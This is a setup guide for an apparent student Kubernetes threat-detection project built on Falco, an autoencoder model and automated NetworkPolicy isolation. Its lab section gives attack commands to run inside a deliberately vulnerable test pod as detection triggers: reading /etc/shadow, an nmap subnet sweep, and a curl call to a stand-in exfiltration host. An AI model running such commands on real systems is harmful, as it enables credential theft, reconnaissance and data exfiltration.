# How to Run — AIOps-Enabled Threat Intelligence System

This guide outlines **two execution scenarios**:

| Scenario | Environment Required | What It Demonstrates |
|---|---|---|
| **A. Local Simulation & SOC Demo** | Python 3.9+ (Laptop) | Full end-to-end ML detection pipeline, REST API, and SOC dashboard with synthetic Falco telemetry |
| **B. Local Kubernetes Cluster** | Docker + Minikube + kubectl | Real container syscall monitoring via Falco, automated NetworkPolicy pod isolation, and live telemetry ingestion |

---

## Scenario A: Local Simulation & SOC Dashboard Demo (5 Minutes)

This scenario runs the complete detection engine, automated containment logic (in dry-run mode), and the real-time SOC dashboard locally without needing Kubernetes.

### 1. Prerequisites
- Python 3.9+
- Node.js / `npx` (for serving the dashboard)

### 2. Environment Setup

Open **PowerShell** and execute:

```powershell
# Navigate to the project root
cd C:\Users\aditya\Documents\PROJECTS\FYP

# Create and activate Python virtual environment
python -m venv .venv
.\.venv\Scripts\Activate.ps1

# Install required packages
pip install -r requirements.txt
```

### 3. Step-by-Step Execution

```powershell
# Step 1: Train the Autoencoder Model (generates weights & threshold in models/autoencoder/)
python scripts/train_model.py --events 2000 --epochs 30
```

Now open a **second terminal**:

```powershell
# Step 2: Start the Threat Detection Webhook API (Terminal 1 — keep open)
python response_engine/webhook_server.py --port 5000 --model-dir models/autoencoder
```

Open a **third terminal**:

```powershell
# Step 3: Start the SOC Dashboard UI (Terminal 2 — keep open)
npx -y serve dashboard -l 3333
```

### 4. Access the Dashboard
- **SOC Dashboard**: Open [http://localhost:3333](http://localhost:3333) in your browser.
- **Engine Status API**: Check [http://localhost:5000/api/v1/status](http://localhost:5000/api/v1/status).

### 5. Simulate Threat Detections

Open a **fourth terminal** to send test alerts:

```powershell
# 1. Container Escape Simulation (CRITICAL)
Invoke-RestMethod -Method POST -Uri "http://localhost:5000/api/v1/alert" -ContentType "application/json" -Body '{
  "pod": "api-backend-ghi56",
  "namespace": "aiops-security",
  "threat_type": "container_escape",
  "confidence_score": 0.96,
  "mitre_technique": "T1611",
  "anomaly_score": 0.91,
  "risk_level": "CRITICAL"
}'

# 2. Interactive Shell Spawn Simulation (HIGH)
Invoke-RestMethod -Method POST -Uri "http://localhost:5000/api/v1/alert" -ContentType "application/json" -Body '{
  "pod": "web-frontend-abc12",
  "namespace": "aiops-security",
  "threat_type": "shell_execution",
  "confidence_score": 0.89,
  "mitre_technique": "T1609",
  "anomaly_score": 0.82,
  "risk_level": "HIGH"
}'

# 3. Data Exfiltration Simulation (HIGH)
Invoke-RestMethod -Method POST -Uri "http://localhost:5000/api/v1/alert" -ContentType "application/json" -Body '{
  "pod": "payment-svc-9c4d2",
  "namespace": "aiops-security",
  "threat_type": "exfiltration",
  "confidence_score": 0.92,
  "mitre_technique": "T1041",
  "anomaly_score": 0.86,
  "risk_level": "HIGH"
}'
```

Refresh or watch [http://localhost:3333](http://localhost:3333) to observe:
- **Live Alerts Table**: New threat events with confidence & anomaly scores.
- **Entity Status**: Compromised pods highlighted and isolated.
- **Response Log**: Automated NetworkPolicy containment actions recorded.

---

## Scenario B: Local Kubernetes Cluster (Real Syscall Monitoring)

This scenario deploys the entire runtime monitoring infrastructure into a local Minikube cluster.

> 📖 **Linux Users:** A complete step-by-step Linux installation and troubleshooting walkthrough is available in [docs/k8s_linux_setup_guide.md](docs/k8s_linux_setup_guide.md).

### 1. Prerequisites
- [Docker Desktop](https://www.docker.com/products/docker-desktop/) (Running)
- [Minikube](https://minikube.sigs.k8s.io/docs/start/) (`winget install Kubernetes.minikube`)
- [kubectl](https://kubernetes.io/docs/tasks/tools/install-kubectl-windows/) (`winget install Kubernetes.kubectl`)
- [Helm](https://helm.sh/docs/intro/install/) (`winget install Helm.Helm`)

### 2. Start Cluster & Deploy Workloads

```powershell
# 1. Start Minikube with sufficient resources
minikube start --driver=docker --cpus=4 --memory=4096

# 2. Create isolated namespace
kubectl apply -f infrastructure/k8s/namespace.yaml

# 3. Deploy intentionally vulnerable testbed microservice
kubectl apply -f infrastructure/k8s/vulnerable-app/

# 4. Verify running pods
kubectl get pods -n aiops-security
```

### 3. Deploy Falco Runtime Monitor

```powershell
# Add Falco Helm repository
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Install Falco DaemonSet with JSON output enabled
helm install falco falcosecurity/falco `
  --namespace aiops-security `
  --set json_output=true

# Apply custom Falco detection rules (if using custom config)
kubectl apply -f infrastructure/k8s/falco/
```

### 4. Run Webhook Engine with Live Kubernetes Enforcement

```powershell
# Terminal 1: Start Webhook Server with Kubernetes NetworkPolicy enforcement enabled
$env:DRY_RUN="false"
python response_engine/webhook_server.py --port 5000

# Terminal 2: Stream live Falco logs directly into normalizer and forward to API
kubectl logs -l app.kubernetes.io/name=falco -n aiops-security --follow | `
  python infrastructure/telemetry/log_aggregator.py --stdin --forward-url http://localhost:5000/api/v1/event --output unified_telemetry.jsonl
```

### 5. Trigger Real Container Attack Scenarios

Exec into the vulnerable testbed container and execute attack behaviors:

```powershell
# Get vulnerable pod name
$POD = kubectl get pods -n aiops-security -l component=api-backend -o jsonpath="{.items[0].metadata.name}"

# 1. Trigger Shell Execution rule:
kubectl exec -it $POD -n aiops-security -- /bin/bash

# Inside container:
# 2. Credential access:
cat /etc/shadow

# 3. Port discovery / scanning:
apt-get update && apt-get install -y nmap
nmap -sP 10.244.0.0/24

# 4. Suspicious outbound network connection:
curl http://203.0.113.10:9999/exfil
```

Falco detects the anomalous syscall patterns → stream is normalized → Autoencoder / Heuristic pipeline scores the anomaly → MITRE techniques mapped → NetworkPolicy quarantine is applied to `$POD`.

---

## Automated End-to-End Pipeline Testing

To run the complete automated end-to-end integration test (testing live telemetry ingestion, ML scoring, MITRE ATT&CK mapping, automated remediation, and dataset persistence):

```powershell
# 1. Ensure webhook server is running (Terminal 1)
python response_engine/webhook_server.py --port 5000 --model-dir models/autoencoder

# 2. Execute E2E Integration Suite (Terminal 2)
python scripts/test_e2e_pipeline.py --url http://localhost:5000
```

### Telemetry Storage & Audit Trails
Processed runtime events and automated response alerts are persistently stored at:
- **`datasets/falco/processed/runtime_detections.jsonl`**: All processed telemetry events with ML scoring and detection metadata.
- **`datasets/falco/processed/runtime_alerts.jsonl`**: High & Critical severity alerts that triggered automated containment actions.

---

## Unit & Component Tests

To run the comprehensive test suite across all modules:

```powershell
pytest tests/ -v
```

All 27 test cases validate:
- Preprocessing, schema validation & feature extraction
- Autoencoder forward pass, reconstruction MSE, and thresholding
- Deterministic MITRE ATT&CK mapping & kill chain staging
- Webhook REST API endpoints, `/api/v1/event` ML inference, and NetworkPolicy generation logic
